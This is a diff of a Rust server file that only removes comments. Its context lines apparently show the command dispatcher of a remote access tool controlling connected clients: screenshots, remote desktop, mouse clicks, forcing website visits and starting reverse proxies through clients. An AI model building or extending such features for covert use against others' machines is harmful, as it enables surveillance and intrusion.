@@ -146,7 +146,6 @@ impl ServerWrapper {
             use crate::commands::ServerCommand::*;
 
             match p {
-                // Infrastructure and logging
                 Log(log) => self.log_events.log_once(log).await,
 
                 CloseClientSessions() => {
@@ -167,7 +166,6 @@ impl ServerWrapper {
                     self.log_events.tauri_handle = Some(self.tauri_handle.clone().unwrap());
                 }
 
-                // Client connection handling
                 EncryptionRequest(tx, otx) => {
                     handle_encryption_request(
                         tx,
@@ -223,7 +221,6 @@ impl ServerWrapper {
                     self.connected_users.remove(&addr);
                 }
 
-                // Client actions - simplified using generic command handler
                 VisitWebsite(addr, data) => {
                     self.handle_command(&addr, ClientboundPacket::VisitWebsite(data))
                         .await
@@ -306,7 +303,6 @@ impl ServerWrapper {
                 StopRemoteDesktop(addr) => {
                     self.handle_command(&addr, ClientboundPacket::StopRemoteDesktop)
                         .await;
-                    // Reset input state
                     let reset_input = KeyboardInputData {
                         key_code: 0,
                         character: "".to_string(),
@@ -334,7 +330,6 @@ impl ServerWrapper {
                         .await
                 }
 
-                // Simple commands without logging
                 MouseClick(addr, data) => {
                     self.send_client_packet(&addr, ClientboundPacket::MouseClick(data))
                         .await
@@ -422,7 +417,6 @@ impl ServerWrapper {
                     })).await;
                 },
 
-                // Client data responses - consolidated pattern
                 ScreenshotData(addr, data) => {
                     if let Some(_client) = self.connected_users.get(&addr) {
                         self.emit_serde_payload(
@@ -542,7 +536,6 @@ impl ServerWrapper {
                     }
                 }
 
-                // Utilities
                 GetClients(resp) => {
                     resp.send(self.connected_users.values().cloned().collect())
                         .ok();
@@ -552,7 +545,6 @@ impl ServerWrapper {
                     resp.send(self.connected_users.get(&addr).cloned()).ok();
                 }
 
-                // Reverse proxy handling
                 StartReverseProxy(addr, port, local_port) => {
                     self.handle_command(&addr, ClientboundPacket::StartReverseProxy(port.clone()))
                         .await;
